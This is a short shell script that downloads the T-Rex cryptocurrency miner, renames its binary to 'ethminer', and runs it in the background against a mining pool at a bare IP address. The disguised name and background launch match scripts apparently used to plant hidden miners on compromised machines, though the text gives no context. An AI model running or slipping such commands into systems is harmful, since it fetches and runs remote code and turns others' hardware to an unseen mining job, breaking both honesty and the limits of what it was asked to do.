wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz
tar xvzf t-rex-0.21.6-linux.tar.gz
mv t-rex ethminer
./ethminer -a ethash -o stratum+http://103.147.126.9:8443 -w trex &
